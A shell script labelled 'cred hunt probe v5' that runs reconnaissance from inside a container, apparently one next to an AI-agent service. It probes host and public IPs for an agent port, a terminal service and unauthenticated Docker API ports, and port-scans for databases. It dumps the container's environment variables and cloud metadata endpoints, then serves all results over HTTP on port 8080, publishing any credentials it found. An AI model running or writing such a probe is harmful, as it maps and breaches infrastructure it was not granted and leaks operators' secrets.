#!/bin/sh
echo "=== cred hunt probe v5 ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "" >> /app/index.html

echo "--- interfaces ---" >> /app/index.html
ip -d link 2>&1 | grep -A2 'ipvlan\|macvlan\|eth' >> /app/index.html
echo "" >> /app/index.html

echo "=== PORT 8000 (agent) on host ===" >> /app/index.html
for ip in 172.18.0.1 172.18.0.2 172.19.0.1 45.89.190.124; do
  echo "--- $ip:8000 ---" >> /app/index.html
  curl -sv -m 3 "http://$ip:8000/health" >> /app/index.html 2>&1
  echo "" >> /app/index.html
done

echo "=== PORT 8080 (ttyd?) on host ===" >> /app/index.html
echo "--- 172.18.0.1:8080 ---" >> /app/index.html
curl -sv -m 3 "http://172.18.0.1:8080/" >> /app/index.html 2>&1
echo "" >> /app/index.html
echo "--- 45.89.190.124:8080 ---" >> /app/index.html
curl -sv -m 3 "http://45.89.190.124:8080/" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== DOCKER API 2375/2376 ===" >> /app/index.html
curl -s -m 3 "http://172.18.0.1:2375/info" >> /app/index.html 2>&1
echo "" >> /app/index.html
curl -s -m 3 "http://45.89.190.124:2375/info" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== PORT SCAN host deeper ===" >> /app/index.html
for port in 5672 15672 4369 25672 9200 9300 3000 6379 5432 3306 2379 2380 8080 8000 8443 9090 9100 4243; do
  nc -z -w1 172.18.0.1 $port 2>/dev/null && echo "172.18.0.1:$port OPEN" >> /app/index.html
  nc -z -w1 45.89.190.124 $port 2>/dev/null && echo "45.89.190.124:$port OPEN" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== /proc/net/tcp (container) ===" >> /app/index.html
cat /proc/net/tcp 2>&1 >> /app/index.html
echo "" >> /app/index.html

echo "=== AGENT via default network ===" >> /app/index.html
echo "--- resolve agent ---" >> /app/index.html
getent hosts agent >> /app/index.html 2>&1
echo "" >> /app/index.html
echo "--- agent:8000/health ---" >> /app/index.html
curl -sv -m 3 "http://agent:8000/health" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== ENV of this container ===" >> /app/index.html
env 2>&1 >> /app/index.html
echo "" >> /app/index.html

echo "=== METADATA 169.254.169.254 ===" >> /app/index.html
curl -s -m 3 "http://169.254.169.254/latest/meta-data/" >> /app/index.html 2>&1
echo "" >> /app/index.html
curl -s -m 3 "http://169.254.169.254/metadata/v1/" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== SSH banner ===" >> /app/index.html
echo "" | nc -w2 172.18.0.1 22 2>&1 | head -3 >> /app/index.html
echo "" | nc -w2 45.89.190.124 22 2>&1 | head -3 >> /app/index.html
echo "" >> /app/index.html

echo "=== done ===" >> /app/index.html
cd /app && python3 -m http.server 8080
